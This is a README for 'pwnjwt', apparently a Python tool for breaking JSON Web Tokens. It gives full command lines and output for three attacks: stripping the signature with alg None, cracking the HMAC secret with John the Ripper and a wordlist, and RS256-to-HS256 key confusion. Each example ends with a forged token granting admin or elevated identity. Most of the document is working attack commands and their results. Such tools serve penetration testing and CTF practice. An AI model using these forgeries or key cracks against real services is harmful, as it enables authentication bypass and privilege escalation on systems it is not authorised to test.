# pwnjwt
JWT pwn Python module

This small module allows you to create JWToken instances. This object will store informations about the token such as if it's signed and with witch algorithm.
But if you have JohnTheRipper installed on your path and (optionally) a wordlist you could try to break the secret key of the token. Then you'll be able to forge a new valid token, signed with the cracked key.

You can use it by 2 ways:
 - Standalone : `./pwnjwt.py -b -w /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE`
 - As a module in Python:
 ```python
 from pwnjwt import JWToken

 token = JWToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE')

 # OR if you know the key
 token = JWToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE', key='Sn1f')

 token.encoded == 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE'

 token.header == {'typ':'JWT', 'alg':'HS256'}
 token.signed == True
 token.algo   == 'HS256'
 token.key    == '' # OR 'Sn1f'
 token.payload == {'role': 'guest'}

 # Will bruteforce and update the token.key
 token.bruteforce(wordlist='../rockyou.txt')

 # If you got the key (token.key):
 new_token = token.forge({'role':'admin'})
 ```

# Standalone Examples

 The 3 main ways to hack JWT are:
  1. Remove signature and set algorithm to None
  2. Bruteforce the key (as it can be done offline)
  3. If encoded in RS256 (asymetric Private/Public keys) -> switch to HS256 with
    public key as key.

#### Case 1 - Unsign

```bash
./pwnjwt.py -f '{"username":"admin"}' -a None \
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.\
cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
```

Output:
```
Token     : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
Header    : {'alg': 'HS256', 'typ': 'JWT'} (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)
Payload   : {'sub': '1234567890', 'name': 'John Doe', 'admin': True} (eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9)
Algorithm : HS256
Key       :


[+] New Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```

#### Case 2 - Crack the key

```bash
./pwnjwt.py -b -w /usr/share/wordlists/rockyou.txt \
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.\
cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
```

Output :
```
[*] Starting Bruteforce with John using /usr/share/wordlists/rockyou.txt.
[+] Key found: Sn1f

Token     : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
Header    : {'alg': 'HS256', 'typ': 'JWT'} (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)
Payload   : {'sub': '1234567890', 'name': 'John Doe', 'admin': True} (eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9)
Algorithm : HS256
Key       : Sn1f
```

Or if key wasn't found :
```
[*] Starting Bruteforce with John using /usr/share/wordlists/rockyou.txt.
[-] Key not found.

Token     : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
Header    : {'alg': 'HS256', 'typ': 'JWT'} (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)
Payload   : {'sub': '1234567890', 'name': 'John Doe', 'admin': True} (eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9)
Algorithm : HS256
Key       :
```

#### Case 3 - Switching RSA256 - HMAC-SHA256

```bash
./pwnjwt.py -f '{"username":"administrator_root_superGOD"}' -a HS256 \
-k public.pem \
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.\
eyJ1c2VybmFtZSI6IkdvZE1hc3RlciJ9.\
QxrGZtmKXEzoLLdnUm1AZDyNZttM4GFeJcC3E66uQWF4vp2hAbHc2j1uzesS7Mha9i2EEtb\
8PnPw6UHSiIp965kuHhKM6O3m-2S36lKiTE-qGGW66Run3g4y1BuhUGZuxsnn2B3YlznHcF\
P1WR3DbybQDf7N7OmtLLZMWsRD0A-fzj_RiPjv_EzFVtCBPJMApvF7JxXosd4nlpVa8pxYR\
hPU0fjLGGYB2zxokarZLWCpcdGde_5Rs76gnerEvcptXp5zTxWF0hF6JNqrAng7JdtS_uo5\
CYjQ0DSHXATdqNd-mZdGHeYUwQe1JgTJ7oLal4GNhspwaQCIa5R9KFx8rw
```

Output:
```
Token     : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IkdvZE1hc3RlciJ9.QxrGZtmKXEzoLLdnUm1AZDyNZttM4GFeJcC3E66uQWF4vp2hAbHc2j1uzesS7Mha9i2EEtb8PnPw6UHSiIp965kuHhKM6O3m-2S36lKiTE-qGGW66Run3g4y1BuhUGZuxsnn2B3YlznHcFP1WR3DbybQDf7N7OmtLLZMWsRD0A-fzj_RiPjv_EzFVtCBPJMApvF7JxXosd4nlpVa8pxYRhPU0fjLGGYB2zxokarZLWCpcdGde_5Rs76gnerEvcptXp5zTxWF0hF6JNqrAng7JdtS_uo5CYjQ0DSHXATdqNd-mZdGHeYUwQe1JgTJ7oLal4GNhspwaQCIa5R9KFx8rw
Header    : {'typ': 'JWT', 'alg': 'RS256'} (eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9)
Payload   : {'username': 'GodMaster'} (eyJ1c2VybmFtZSI6IkdvZE1hc3RlciJ9)
Algorithm : RS256
Key       : -----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3KthdfLESvFKn9LqBfvT
RlakP02YGC7QJ4ywfFiOcWjrXvKKjUkPd3J+A/7/MjgbgGZaroJgDZn5WsDg40dx
a3DiVUQU7VGDBh1eKbslfabopCHtQWZ6zLyR38OMqlZjanzv2eEJCMmMxTzykTXm
GAZNIdHC8FuuXe6cdVGyfjRNqAfOUUzeFo7GCTWORXMf1/l1ouzJBO5SVj1YluMZ
Rwys1ysHZZDn/NAYY/vaubSq7jYEYbwRdfD3tJpnISHHUKH6YCbYjDApisaSiFV/
Q/JbE4OJS5NErZ5z6froyBbi+F1s85hfwB5UJPDvKlVVJpO30WPAl3pl/ddeGjtl
eQIDAQAB
-----END PUBLIC KEY-----



[+] New Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3Jfcm9vdF9zdXBlckdPRCJ9.ccQYH4Ch9PSeTwHmRJnRzgA9RUki20iMNOhNvLEOajk
```

And to check the new token:

```bash
./pwnjwt.py -k public.pem eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3Jfcm9vdF9zdXBlckdPRCJ9.ccQYH4Ch9PSeTwHmRJnRzgA9RUki20iMNOhNvLEOajk
```
```
Token     : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3Jfcm9vdF9zdXBlckdPRCJ9.ccQYH4Ch9PSeTwHmRJnRzgA9RUki20iMNOhNvLEOajk
Header    : {'typ': 'JWT', 'alg': 'HS256'} (eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9)
Payload   : {'username': 'administrator_root_superGOD'} (eyJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3Jfcm9vdF9zdXBlckdPRCJ9)
Algorithm : HS256
Key       : -----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3KthdfLESvFKn9LqBfvT
RlakP02YGC7QJ4ywfFiOcWjrXvKKjUkPd3J+A/7/MjgbgGZaroJgDZn5WsDg40dx
a3DiVUQU7VGDBh1eKbslfabopCHtQWZ6zLyR38OMqlZjanzv2eEJCMmMxTzykTXm
GAZNIdHC8FuuXe6cdVGyfjRNqAfOUUzeFo7GCTWORXMf1/l1ouzJBO5SVj1YluMZ
Rwys1ysHZZDn/NAYY/vaubSq7jYEYbwRdfD3tJpnISHHUKH6YCbYjDApisaSiFV/
Q/JbE4OJS5NErZ5z6froyBbi+F1s85hfwB5UJPDvKlVVJpO30WPAl3pl/ddeGjtl
eQIDAQAB
-----END PUBLIC KEY-----


```
